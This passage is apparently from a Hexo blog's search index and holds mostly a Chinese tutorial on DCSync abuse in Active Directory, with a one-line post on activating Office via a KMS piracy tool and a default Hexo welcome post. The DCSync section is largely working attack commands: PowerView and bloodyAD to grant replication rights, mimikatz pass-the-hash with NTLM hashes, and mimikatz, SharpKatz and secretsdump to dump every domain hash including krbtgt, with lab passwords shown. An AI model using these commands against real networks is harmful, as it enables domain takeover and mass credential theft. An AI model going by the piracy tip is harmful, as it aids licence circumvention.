        <content type="html"><![CDATA[<p>安装office<br>使用HEU_KMS_Activator_v42.0.1劫持激活</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/dcsync%E5%88%A9%E7%94%A8/"/>
      <url>/2024/08/10/dcsync%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>title: my blog</p><h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><p>在域中，不同的DC之间，每隔15分钟会进行一次域数据的同步。当一个DC（辅助DC）想从其他DC（主DC）获取数据时，辅助DC会向主DC发起一个GetNCChanges请求。请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用的这个原理，通过Directory Replication Service(DRS)服务的GetNCChanges接口向域控发起数据同步请求。</p><h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><p>获得以下任一用户的权限：</p><ul><li>Domain Admins组内的用户</li><li>Administrators组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>默认只有域控主机账号和域管理员能进行Dcsync，其机器账号拥有WriteACL的权限，可以给指定用户添加Dcsync来dump域哈希。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">复制目录更改（DS-Replication-Get-Changes）</span><br><span class="line"></span><br><span class="line">全部复制目录更改 (DS-Replication-Get-Changes-All )</span><br></pre></td></tr></table></figure><h1 id="查寻存在DCSync权限的账户"><a href="#查寻存在DCSync权限的账户" class="headerlink" title="查寻存在DCSync权限的账户"></a>查寻存在DCSync权限的账户</h1><h2 id="域控查看"><a href="#域控查看" class="headerlink" title="域控查看"></a>域控查看</h2><p>上帝视角先了解一下这几个权限的位置，打开AD管理中心，又键域名，属性</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688542032410-c6edd7c5-a710-4840-b97c-d0e1c9d030ac.png"></p><h2 id="adfind"><a href="#adfind" class="headerlink" title="adfind"></a>adfind</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -s subtree -b &quot;DC=guan,DC=com&quot; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&quot;Replicating Directory Changes&quot;;; -recmute</span><br><span class="line"></span><br><span class="line">AdFind.exe -s subtree -b &quot;DC=guan,DC=com&quot; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&quot;Replicating Directory Changes All&quot;;; -recmute</span><br></pre></td></tr></table></figure><p> <img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688539957867-9defb97a-e336-41fa-a350-c86a673570cc.png"></p><h1 id="给特定用户赋予DCSync权限"><a href="#给特定用户赋予DCSync权限" class="headerlink" title="给特定用户赋予DCSync权限"></a>给特定用户赋予DCSync权限</h1><h2 id="powerview-ps1"><a href="#powerview-ps1" class="headerlink" title="powerview.ps1"></a>powerview.ps1</h2><p>使用hash传递跳出的新cmd弹窗，或在我们控制的域机器上登录拥有赋予dcsync权限（域管，或域管机器用户）用户，执行以下命令达到远程赋予dcsync的功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">更改默认策略，使得脚本可以执行：</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">或</span><br><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line"></span><br><span class="line">导入脚本：</span><br><span class="line">import-module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">将指定用户写入DCSync：</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=guan,DC=com&quot; -PrincipalIdentity guan1 -Rights DCSync -Verbose</span><br><span class="line">cmd下写入：</span><br><span class="line">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity \&quot;DC=test,DC=com\&quot; -PrincipalIdentity haha -Rights DCSync -Verbose&#125;&quot;</span><br><span class="line"></span><br><span class="line">删除指定用户的DCSync:</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC=guan,DC=com&quot; -PrincipalIdentity guan1 -Rights DCSync -Verbose</span><br><span class="line">cmd下删除：</span><br><span class="line">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \&quot;DC=test,DC=com\&quot; -PrincipalIdentity test -Rights DCSync -Verbose&#125;&quot;</span><br><span class="line"></span><br><span class="line">查询具有DCSync权限的用户：</span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;DS-Replication-Get-Changes&quot;&#125;</span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;Replicating Directory Changes&quot;&#125; </span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;DS-Replication-Get-Changes-All&quot;&#125;</span><br><span class="line"></span><br><span class="line">查询用户的ACL:</span><br><span class="line">Get-DomainObjectAcl -Identity guan1 -domain guan.com -ResolveGUIDs</span><br></pre></td></tr></table></figure><p>赋予过程：</p><p>用域管远程登录控制的域机器：</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982125103-46943000-65de-45ab-a253-4e982f151eec.png"></p><p>为域用户guan1赋予dcsync权限</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982179615-ce32079e-4f8c-4b06-b91b-8b523a775e8e.png"></p><p>查询结果：</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982333198-11733d5d-99c4-45a6-92d1-22bec309254e.png"></p><p>查看用户guan1的访问控制列表</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982453962-9d6a906c-0164-44c4-b5d9-35648f762d5e.png"></p><h2 id="bloodyAD-py"><a href="#bloodyAD-py" class="headerlink" title="bloodyAD.py"></a>bloodyAD.py</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">查看帮助文档</span><br><span class="line">python3 bloodyAD.py -h</span><br><span class="line">python3 bloodyAD.py add -h</span><br><span class="line">python3 bloodyAD.py add dcsync -h</span><br><span class="line"></span><br><span class="line">知道账户密码：</span><br><span class="line">proxychains3 python3 bloodyAD.py -d hack-guan.com -u exchange$ -p Hack@12 --host 10.10.10.10 add dcsync hackweb</span><br><span class="line"></span><br><span class="line">知道账户hash:</span><br><span class="line">proxychains3 python3 bloodyAD.py -d hack-guan.com -u exchange$ -p :690f662f7f12700eae9e1c65dcd648be --host 10.10.10.10 add dcsync hackweb</span><br><span class="line"></span><br><span class="line">删除dcsync：将add改为remove即可</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  &#123;add,get,remove,set&#125;</span><br><span class="line">    add                 [ADD] function category</span><br><span class="line">    get                 [GET] function category</span><br><span class="line">    remove              [REMOVE] function category</span><br><span class="line">    set                 [SET] function category</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689315265810-cc5ccfa2-1828-4c4d-bb40-67fa091b73e1.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689315246685-3214540d-ae6b-4131-90b1-2dafa5bf0397.png"></p><p><strong>验证</strong></p><p><strong>1）建立代理</strong></p><p><strong>2）hash传递目标域用户</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689321628111-60367138-569b-4d05-9c6f-f016462df7e5.png"></p><p>3）SharpKatz.exe利用目标账户的dcsync功能导出域所有hash（mimikatz不能远程导出，无法指定域）</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689321710504-826ade1b-995b-42c7-8216-782563908a73.png"></p><p>4）成功</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689321862196-7a7fadea-000b-4c01-8d79-c1e902af8cd2.png"></p><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><p>（环境：通过socks5代理使得外域机可以访问域内主机，通过远程桌面访问我们控制的域机器来操作）</p><p>前提，已经通过上述步骤为所控制的域用户赋予DCSync权限</p><p>将mimitakz上传到我们完全控制的域机器，远程登录（该域用户也是本地管理员）</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688997617863-67a87615-a827-4d4b-a8cc-b5cae6863ed3.png"></p><p>直接用以下命令导出域hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log Micropoor.txt&quot;  &quot;lsadump::dcsync /domain:guan.com /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><h2 id="dc-hash传递"><a href="#dc-hash传递" class="headerlink" title="dc$ hash传递"></a>dc$ hash传递</h2><p>(环境：通过socks5代理使得外域机可以访问域内主机，通过远程桌面访问我们控制的域机器来操作)</p><p>验证证初始环境</p><p>mimikatz使用dcsync功能导出hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log Micropoor.txt&quot;  &quot;lsadump::dcsync /domain:guan.com /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p>失败报错，当前域用户没有dcsync权限</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688562663286-8e21ee82-045a-423a-9c7d-eb9e411108e4.png"></p><p>先拿到DC$ 的hash</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688562356812-cfbac079-0c06-4037-bdac-eaa40d088ff3.png"></p><p>利用mimikatz 进行hash传递获得注入dc$后的命令窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:dc$ /domain:guan.com /ntlm:963acb058f2fd451a689d86b51739fe1&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688562822915-0b5d5e8e-5a38-4e8d-af81-70324577f00a.png"></p><p>再次实践，mimikatz使用dcsync功能导出hash</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688998111140-4d2eab5e-450c-4e48-a2df-b33bae8f875a.png"></p><p>尝试在此窗口下加载powerview脚本将dcsync 权限赋给guan1</p><p>失败，可能dc$没有这个权限</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688998216159-09346049-e7bc-440e-b19e-c9be96295d2e.png"></p><p>尝试用域管的hash进行hash传递，验证是否真的是dc$账户没有赋予dcsync的权限，还是说是远程登录相关限制的问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:guan.com /ntlm:3642639123c37049ac21e1d12b39eb17&quot;</span><br></pre></td></tr></table></figure><p>域管的hash传递可以成功赋予</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688998621580-69b4cb09-0128-4819-ba14-fd0c15f5967c.png"></p><p>确认是dc$只是有dcsync这个功能，但并没有赋予其它域用户这个功能的权限</p><h2 id="Sharpkatz"><a href="#Sharpkatz" class="headerlink" title="Sharpkatz"></a>Sharpkatz</h2><p>（先通过socks代理使得外域机能联系域内主机，使用proxifier）</p><p>以用域管账户密码导出krbtgt为例（域管默认有dcsync这个权限）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SharpKatz.exe --Command dcsync --User krbtgt --Domain guan.com --DomainController 10.10.10.60 --AuthUser administrator --AuthDomain Guan.com --AuthPassword Guan207566903</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sharekatz.exe -h 查看帮助文档</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689002057974-be26b00f-ceab-47e1-94ed-80c516707b2d.png"></p><h2 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">知道账户密码</span><br><span class="line">proxychains3 python3 secretsdump.py GUAN/administrator:Guan207566903@10.10.10.60</span><br><span class="line"></span><br><span class="line">知道账户hash</span><br><span class="line">proxychains3 python3 secretsdump.py -hashes :3642639123c37049ac21e1d12b39eb17 GUAN/administrator@10.10.10.60</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689002527669-343a90be-07af-470a-976e-c593af58b4e9.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689002757841-43d5f596-ebad-4984-aaa2-f417ec20ffa9.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/10/hello-world/"/>
      <url>/2024/08/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
